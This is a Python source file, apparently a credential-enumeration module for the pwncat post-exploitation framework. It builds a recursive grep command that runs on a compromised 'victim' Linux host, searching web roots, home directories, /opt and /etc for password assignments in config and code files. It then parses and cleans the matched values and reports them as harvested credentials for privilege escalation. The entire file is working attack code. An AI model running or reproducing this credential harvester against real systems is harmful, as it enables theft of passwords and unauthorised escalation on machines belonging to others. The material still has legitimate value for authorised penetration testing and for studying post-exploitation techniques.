#!/usr/bin/env python3
import os
import re

import pwncat
from pwncat.platform.linux import Linux
from pwncat.modules.agnostic.enumerate import EnumerateModule, Schedule
from pwncat.modules.linux.enumerate.creds import PasswordData


class Module(EnumerateModule):
    """
    Search the victim file system for configuration files which may
    contain passwords. This uses a regular expression based search
    to abstractly extract things which look like variable assignments
    within configuration files that look like passwords.
    """

    PROVIDES = ["creds.password"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session):

        # The locations we will search in for passwords
        locations = ["/var/www", "$HOME", "/opt", "/etc"]
        # Known locations which match this search but don't contain useful entries
        blacklist = ["openssl.cnf", "libuser.conf"]
        # The types of files which are "code". This means that we only recognize the
        # actual password if it is a literal value (enclosed in single or double quotes)
        code_types = [".c", ".php", ".py", ".sh", ".pl", ".js", ".ini", ".json"]
        # grep = pwncat.victim.which("grep")
        grep = "grep"

        if grep is None:
            return

        command = f"{grep} -InriE 'password[\"'\"'\"']?\\s*(=>|=|:)' {' '.join(locations)} 2>/dev/null"

        # Run the command on the remote host
        proc = session.platform.Popen(
            command, shell=True, text=True, stdout=pwncat.subprocess.PIPE
        )

        # Iterate through the output
        with proc.stdout as filp:
            for line in filp:
                try:
                    # Decode the line and separate the filename, line number, and content
                    line = line.strip().split(":")
                except UnicodeDecodeError:
                    continue

                # Ensure we got all three (should always be 3)
                if len(line) < 3:
                    continue

                # Extract each individual piece
                path = line[0]
                content = ":".join(line[2:])
                try:
                    lineno = int(line[1])
                except ValueError:
                    # If this isn't an integer, we can't trust the format of the line...
                    continue

                password = None

                # Ensure this file isn't in our blacklist
                # We will still report it but it won't produce actionable passwords
                # for privesc because the blacklist files have a high likelihood of
                # false positives.
                if os.path.basename(path) not in blacklist:
                    # Check for simple assignment
                    match = re.search(r"password\s*=(.*)", content, re.IGNORECASE)
                    if match is not None:
                        password = match.group(1).strip()

                    # Check for dictionary like in python with double quotes
                    match = re.search(r"password[\"']\s*:(.*)", content, re.IGNORECASE)
                    if match is not None:
                        password = match.group(1).strip()

                    # Check for dictionary is perl
                    match = re.search(
                        r"password[\"']?\s+=>(.*)", content, re.IGNORECASE
                    )
                    if match is not None:
                        password = match.group(1).strip()

                    # Don't mark empty passwords
                    if password is not None and password == "":
                        password = None

                    if password is not None:
                        _, extension = os.path.splitext(path)

                        # Ensure that this is a constant string. For code file types,
                        # this is normally indicated by the string being surrounded by
                        # either double or single quotes.
                        if extension in code_types:
                            if password[-1] == ";":
                                password = password[:-1]
                            if password[0] == '"' and password[-1] == '"':
                                password = password.strip('"')
                            elif password[0] == "'" and password[-1] == "'":
                                password = password.strip("'")
                            else:
                                # This wasn't assigned to a constant, it's not helpful to us
                                password = None

                        # Empty quotes? :(
                        if password == "":
                            password = None

                # This was a match for the search. We  may have extracted a
                # password. Either way, log it.
                fact = PasswordData(self.name, password, path, lineno, uid=None)
                yield fact

        proc.wait()
